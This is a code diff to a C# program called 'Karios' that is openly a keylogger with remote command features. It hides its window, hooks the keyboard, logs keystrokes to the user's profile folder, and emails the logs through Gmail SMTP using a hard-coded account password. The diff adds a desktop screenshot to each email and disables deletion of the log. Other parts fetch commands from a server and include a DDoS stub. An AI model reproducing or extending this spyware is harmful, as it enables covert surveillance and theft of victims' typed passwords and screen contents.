@@ -14,6 +14,8 @@ using System.Windows.Input;
 using System.Net.Sockets;
 using System.Drawing.Imaging;
 using System.Drawing;
+using System.Runtime.Remoting.Messaging;
+using System.Net.Mime;
 
 namespace Karios
 {
@@ -29,19 +31,15 @@ namespace Karios
         private static bool _online = false;
         public static string Commands = "";
         public static string _emailEndpoint;
+        public static string picAttachment;
+        public static Bitmap memoryImage;
 
         public static void Main()
-        {   
+        {
             CommandGet();
-
-            Console.WriteLine("Starting commandget");
-            Console.ReadKey();
-            CommandGet();
-            Console.WriteLine("Finished commandget");
-            Console.ReadKey();
             if (_online)
             {
-                Console.WriteLine("Online does equal true");
+                Console.WriteLine("Starting Program...");
                 Console.ReadKey();
 
                 // Persitance feature
@@ -51,29 +49,13 @@ namespace Karios
                 // Start Application
                 var handle = GetConsoleWindow();
                 ShowWindow(handle, SwHide);
-                _hookId = SetHook(_proc);      
+                _hookId = SetHook(_proc);
                 Application.Run();
-                LaunchWebsite();
                 UnhookWindowsHookEx(_hookId);
             }
+
             Console.WriteLine("IF Statement did not work... exiting");
             Console.ReadKey();
-        }
-
-        public static void RunApplication()
-        {
-            // Hide the window
-
-
-            // Persitance feature
-            // Duplicate(); 
-
-            // Run on startup 
-            // SetStartup();
-            // Start Application
-
-            //Application.Run();
-            //UnhookWindowsHookEx(_hookID);
         }
 
         private static void CommandGet()
@@ -108,14 +90,14 @@ namespace Karios
 
                     //Telling the server this is a new client
                     if (paramaters == "?")
-                         paramaters = paramaters + "newclient=true";
+                        paramaters = paramaters + "newclient=true";
                     else
-                         paramaters = paramaters + "&newclient=true";
-                    
-                      if (paramaters == "?")
-                         paramaters = paramaters + "newclient=false";
+                        paramaters = paramaters + "&newclient=true";
+
+                    if (paramaters == "?")
+                        paramaters = paramaters + "newclient=false";
                     else
-                         paramaters = paramaters + "&newclient=false";
+                        paramaters = paramaters + "&newclient=false";
 
                     // 1 = DDOSOnline
                     if (paramaters == "?")
@@ -186,6 +168,7 @@ namespace Karios
                     catch (WebException)
                     {
                     } //TODO: Handle this Exception.
+
                     var preppedCommand = commands.Split(' ');
 #pragma warning disable 1587
                     /// <summary>
@@ -237,25 +220,27 @@ namespace Karios
 
         private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
         {
-            if (nCode < 0 || wParam != (IntPtr)WM_KEYDOWN) return CallNextHookEx(_hookId, nCode, wParam, lParam);
+            if (nCode < 0 || wParam != (IntPtr) WM_KEYDOWN) return CallNextHookEx(_hookId, nCode, wParam, lParam);
+            // ReSharper disable once UnusedVariable
             var appName = AppDomain.CurrentDomain.FriendlyName;
             var vkCode = Marshal.ReadInt32(lParam);
             var fileName = DateTime.Now.ToString("yyyy-MM-dd");
+            var machineName = Environment.MachineName;
             // StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);
-            var pathToLog = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\" +
-                            fileName + ".txt"; // TODO - get more secret location.
+            var pathToLog = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\" + fileName + machineName + ".txt"; // TODO - get more secret location.
             var sw = new StreamWriter(pathToLog, true);
-            if ((Keys)vkCode != Keys.Space && (Keys)vkCode != Keys.Enter)
+            if ((Keys) vkCode != Keys.Space && (Keys) vkCode != Keys.Enter)
             {
-                sw.Write(((Keys)vkCode).ToString().ToLower());
-                Console.Write(((Keys)vkCode).ToString().ToLower());
+                sw.Write(((Keys) vkCode).ToString().ToLower());
+                Console.Write(((Keys) vkCode).ToString().ToLower());
             }
             else
             {
                 sw.WriteLine("");
-                sw.WriteLine((Keys)vkCode);
-                Console.WriteLine((Keys)vkCode);
+                sw.WriteLine((Keys) vkCode);
+                Console.WriteLine((Keys) vkCode);
             }
+
             sw.Close();
 
             if (File.ReadAllLines(pathToLog).Length <= 100) return CallNextHookEx(_hookId, nCode, wParam, lParam);
@@ -264,30 +249,35 @@ namespace Karios
                 var mail = new MailMessage();
                 var smtpServer = new SmtpClient("smtp.gmail.com"); // VSCode is suggesting another library, "MimeKit" - should be on GitHub if you want to check it out at https://github.com/jstedfast/MimeKit. It may need us to rewrite some code if we do implement it though -- STBoyden
                 mail.From = new MailAddress("GINGIRULES@gmail.com");
-
                 mail.To.Add(_emailEndpoint);
                 mail.Subject = "log from keylogger on" + Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                 mail.Body = "New log file from Computer (" + GetLocalIp(_localIp) + " , finshed at: " + DateTime.Now.ToString("yyyy-MM-dd");
                 var attachment = new Attachment(pathToLog);
-
                 mail.Attachments.Add(attachment);
+                CaptureDesktop();
+                // Convert it!
+                MemoryStream memStream = new MemoryStream(); //new one
+                memoryImage.Save(memStream, ImageFormat.Jpeg); 
+                ContentType contentType = new ContentType();
+                contentType.MediaType = MediaTypeNames.Image.Jpeg;
+                contentType.Name = "screen";
+                mail.Attachments.Add(new Attachment(memStream, contentType));
+
+                // Set ports and stuff
                 smtpServer.Port = 587;
                 smtpServer.Credentials = new NetworkCredential("GINGIRULES@gmail.com", "G1ng1RuleS");
                 smtpServer.EnableSsl = true;
                 smtpServer.Send(mail);
                 //clear mail attachment
                 attachment.Dispose();
-                //copy program to an new destination
             }
             catch
             {
-
                 // ignored
-
-
             }
 
             //System.IO.File.Copy(path, Application.StartupPath + @"\log.txt", true);
+            // ReSharper disable once UnusedVariable
             var alldrives = DriveInfo.GetDrives();
 
             /*
@@ -301,7 +291,7 @@ namespace Karios
                     }
                     */
             //delete log file.
-            File.Delete(pathToLog);
+            //File.Delete(pathToLog);
             return CallNextHookEx(_hookId, nCode, wParam, lParam);
         }
 
@@ -345,16 +335,9 @@ namespace Karios
         {
             using (var socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, 0))
             {
-                try
-                {
-                    socket.Connect("8.8.8.8", 65530);
-                    var endPoint = socket.LocalEndPoint as IPEndPoint;
-                    if (endPoint != null) localIp = endPoint.Address.ToString();
-                    return localIp;
-                }
-                finally
-                {
-                }
+                socket.Connect("8.8.8.8", 65530);
+                if (socket.LocalEndPoint is IPEndPoint endPoint) localIp = endPoint.Address.ToString();
+                return localIp;
             }
         }
 
@@ -376,28 +359,34 @@ namespace Karios
 
         }
 
-    public static void Ddos()
-    {
-        using (var wc = new WebClient())
+        public static void Ddos()
         {
-            try
+            using (var wc = new WebClient())
             {
-            }
-            catch
-            {
-                // ignored
+                try
+                {
+                }
+                catch
+                {
+                    // ignored
+                }
             }
         }
-    }
 
-    private static Image CaptureDesktop()
-    {
-        var rectangle = Screen.PrimaryScreen.Bounds;
-        var bitmap = new Bitmap(rectangle.Width, rectangle.Height, PixelFormat.Format32bppArgb);
-        var graphics = Graphics.FromImage(bitmap);
-        graphics.CopyFromScreen(rectangle.X, rectangle.Y, 0, 0, rectangle.Size, CopyPixelOperation.SourceCopy);
-        return bitmap;
-    }
+        private static Image CaptureDesktop()
+        {
+            // Start the process... 
+            var memoryImage = new Bitmap(1000, 900);
+            Size s = new Size(memoryImage.Width, memoryImage.Height);
+
+            // Create graphics 
+            Graphics memoryGraphics = Graphics.FromImage(memoryImage);
+
+            // Copy data from screen 
+            memoryGraphics.CopyFromScreen(0, 0, 0, 0, s);
+            // Save it! 
+            return memoryImage;
+        }
 
     [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
     private static extern IntPtr SetWindowsHookEx(int idHook,
